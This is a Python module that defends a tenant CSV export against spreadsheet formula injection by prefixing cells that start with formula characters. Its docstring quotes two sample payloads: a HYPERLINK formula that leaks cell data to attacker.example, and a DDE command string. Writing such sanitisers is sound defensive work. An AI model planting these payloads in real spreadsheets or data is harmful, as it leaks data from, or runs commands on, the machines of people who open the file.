"""Make a value safe to put in a spreadsheet cell.

`csv.writer` quotes and escapes correctly, which stops a value breaking the FILE
format. It does nothing about the value being interpreted as a FORMULA when the
file is opened, and that is the actual risk here: a cell beginning `=`, `+`, `-`,
`@`, tab or carriage return is executed by Excel, LibreOffice and Google Sheets.

Every cell in the tenant export is attacker-influenced. Tenant names, unit
labels and notes are typed in at onboarding — by staff, from documents a tenant
supplied — and the export is opened by the landlord on his own machine. A tenant
registered as

    =HYPERLINK("https://attacker.example/?d="&A1,"Click for receipt")

becomes a live link in the landlord's spreadsheet, carrying whatever is in the
neighbouring cell. `=cmd|'/c calc'!A0` is the same trick aimed at DDE.

The fix is one character: prefix the cell with an apostrophe, which every
spreadsheet reads as "this is text". The visible value is unchanged.
"""

#: Characters that make a spreadsheet treat the cell as a formula.
_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def csv_safe(value) -> str:
    """Return `value` as a string that no spreadsheet will evaluate.

    Numbers are passed through unchanged: they are generated server-side from
    Decimal fields, never from user input, and prefixing them would break every
    sum in the exported sheet. Only text is neutralised, and only when it
    actually starts with a formula character.
    """
    if value is None:
        return ""
    if isinstance(value, (int, float)):
        return str(value)
    text = str(value)
    if text.startswith(_FORMULA_PREFIXES):
        return "'" + text
    return text


def csv_safe_row(row) -> list:
    """`csv_safe` across a whole row."""
    return [csv_safe(cell) for cell in row]
